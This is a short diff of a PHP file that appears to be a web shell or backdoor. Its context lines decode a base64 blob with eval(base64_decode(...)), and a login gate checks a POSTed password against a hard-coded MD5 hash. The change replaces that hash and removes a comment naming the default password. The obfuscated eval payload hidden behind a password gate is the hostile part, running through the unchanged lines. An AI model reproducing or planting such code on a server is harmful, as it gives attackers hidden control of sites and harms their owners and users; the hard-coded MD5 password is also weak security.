@@ -6,7 +6,7 @@ $source_bypass ='ZnVuY3Rpb24gc2VjdXJlUGF0aCgkcGF0aCkgewogICAgJHJlYWxQYXRoID0gcmV
    eval(base64_decode($source_bypass));
 if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
-       $hashed_password = 'd489a3289ecdc847cb67f7a480e6f9fa'; // Default Pw : lockfile
+       $hashed_password = 'c296c1aa535b0bba6ccf85d8f9e7afff';
 
        if (md5($entered_password) === $hashed_password) {
            $_SESSION['logged_in'] = true;
